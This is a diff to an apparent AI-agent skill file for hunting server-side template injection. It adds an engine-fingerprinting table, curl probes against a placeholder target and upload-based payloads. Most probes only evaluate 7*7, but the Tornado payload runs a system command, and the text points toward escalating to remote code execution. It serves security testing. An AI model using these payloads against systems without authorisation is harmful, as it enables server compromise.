@@ -3,7 +3,7 @@ name: hunt-ssti
 description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
 ---
 
-## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
+# HUNT-SSTI — Server-Side Template Injection
 > Easy to detect, high payout ($2K–$8K). Direct path to RCE.
 
 ### Detection Payloads (try all)
@@ -38,7 +38,81 @@ Name/bio/description fields, email templates, invoice name, PDF generators,
 URL path parameters, search queries reflected in results, HTTP headers reflected
 ```
 
----
+## Template Engine Fingerprinting
+
+Once a `{{7*7}}`/`${7*7}` math eval confirms SSTI, pin down the exact engine. Each row below is the minimal probe + expected marker per engine.
+
+| Engine (stack) | Detection payload | Marker |
+|---|---|---|
+| Jinja2 / Twig (Python/PHP) | `{{7*7}}` | `49` |
+| Jinja2 (string repetition) | `{{7*'7'}}` | `7777777` |
+| Mako (Python) | `<% print(7*7) %>` | `49` |
+| ERB (Ruby) | `<%= 7*7 %>` | `49` |
+| Smarty (PHP) | `{7*7}` | `49` |
+| Pug / Jade (Node.js) | `#{7*7}` | `49` |
+| Freemarker (Java) | `${7*7}` | `49` |
+| Velocity (Java) | `#set($x=7*7)${x}` | `49` |
+| Tornado (Python) | `{% import os %}{{ os.popen('id').read() }}` | command output |
+| Handlebars (Node.js) | `{{#with "s" as |string|}}{{string.sub "hello" 0 1}}{{/with}}` | `h` |
+| Nunjucks (Node.js) | `{{range.constructor("return 7*7")()}}` | `49` |
+
+```bash
+# Differentiate once math works
+curl -s "https://<target>/?name={{7*'7'}}" | grep "7777777"   # Jinja2 (49 here = Twig)
+curl -s "https://<target>/?name=<%= 7*7 %>" | grep "49"       # ERB
+curl -s "https://<target>/?name={7*7}" | grep "49"            # Smarty
+curl -s 'https://<target>/?name=${7*7}' | grep "49"           # Freemarker / Velocity / Mako
+curl -s "https://<target>/?name=<% print(7*7) %>" | grep "49" # Mako
+curl -s 'https://<target>/?name={% set x = 7*7 %}{{x}}' | grep "49" # Tornado
+```
+
+### Context detection
+
+SSTI can land in HTML, JS-string, or attribute contexts — wrap probes in markers to confirm where it renders:
+
+```bash
+curl -s 'https://<target>/?name=BEFORE{{7*7}}AFTER' | grep "BEFORE49AFTER"
+curl -s 'https://<target>/?name=">{{7*7}}' | grep ">49"
+curl -s "https://<target>/?name={{7*7}}<!--" | grep "49"
+```
+
+### Transport surfaces beyond query params
+
+```bash
+# Form-encoded POST
+curl -s -X POST "https://<target>/contact" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "name={{7*7}}&email=test@test.com&message=hello" | grep "49"
+
+# JSON body
+curl -s -X POST "https://<target>/api/render" \
+  -H "Content-Type: application/json" \
+  -d '{"template":"{{7*7}}"}' | grep "49"
+
+# XML body
+curl -s -X POST "https://<target>/api/process" \
+  -H "Content-Type: application/xml" \
+  -d '<name>{{7*7}}</name>' | grep "49"
+
+# Filename-based SSTI
+echo "test" > '{{7*7}}.txt'
+curl -s -X POST "https://<target>/upload" -F "file=@{{7*7}}.txt" | grep "49"
+
+# SVG upload (XML-backed templates re-rendered server-side)
+cat > payload.svg << 'EOF'
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>{{7*7}}</text>
+</svg>
+EOF
+curl -s -X POST "https://<target>/upload" -F "file=@payload.svg" | grep "49"
+```
+
+### False positives to ignore
+
+- `49` appearing unrelated to the reflection point (page numbers, counters)
+- Math expressions evaluated client-side in JavaScript
+- Template syntax inside comments or pre-rendered content
+- `{{7*7}}` reflected literally (no evaluation = no SSTI)
 
 ## Related Skills & Chains
 
